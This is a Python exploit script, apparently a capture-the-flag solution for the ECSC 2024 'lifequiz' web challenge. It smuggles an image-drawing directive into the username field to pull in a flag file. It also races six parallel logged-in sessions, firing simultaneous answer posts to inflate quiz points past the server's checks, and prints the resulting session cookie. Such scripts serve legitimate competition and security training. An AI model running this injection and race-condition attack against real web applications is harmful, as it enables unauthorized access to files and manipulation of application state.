#!/usr/bin/env python3

import sys
import threading
import requests
import string
import random
import re

# URL = "http://localhost:8000"
URL = "http://lifequiz.challs.open.ecsc2024.it"
USERNAME = '";image src 0,0 0,0"/prizes/flag.jpg'
PARALLEL_REQUESTS = 6

class PostRequestThread(threading.Thread):
    def __init__(self, session, answer):
        super().__init__()
        self.session = session
        self.answer = answer

    def run(self):
        self.session.post(URL + "/quiz.php", data={"answer": self.answer})


def random_str():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(10))


def get_question(s):
    r = s.get(URL + "/quiz.php")
    points = re.findall('You have (\d+) points', r.text)[0]
    question_id = re.findall('Question (\d+)</h3>', r.text)[0]
    answers = re.findall('name="answer" id="(.*?)"', r.text)
    return points, question_id, answers


def main():
    # Note that PHP locks on the sessionid by default, so you need to use a 
    # separate session for every request in your batch or they'll get processed 
    # sequentially. See also:
    # https://portswigger.net/research/smashing-the-state-machine#single-endpoint

    email = random_str()
    
    # register
    r = requests.post(URL + "/login.php", data={"email": email, "username": USERNAME})
    password = re.findall('Your password is "(.+?)"', r.text)[0]
    print(f'Email: {email}, Password: {password}')

    # login
    sessions = []
    for _ in range(PARALLEL_REQUESTS):
        s = requests.Session()
        r = s.post(URL + "/login.php", data={"email": email, "password": password})
        sessions.append(s)
    
    while True:
        r = sessions[0].get(URL + "/quiz.php")
        if "Congratulations" in r.text:
            print(f"Cookie: {sessions[0].cookies.get('PHPSESSID')}")
            sys.exit(0)
        elif "but you need" in r.text:
            sessions[0].get(URL + "/reset.php")
        
        points, question_id, answers = get_question(sessions[0])
        print(f'[Q ID: {question_id}] Points: {points}')

        threads = []
        for ses, ans in zip(sessions, answers*4):
            thread = PostRequestThread(ses, ans)
            threads.append(thread)
        
        # start all threads
        for thread in threads:
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()


if __name__ == "__main__":
    main()
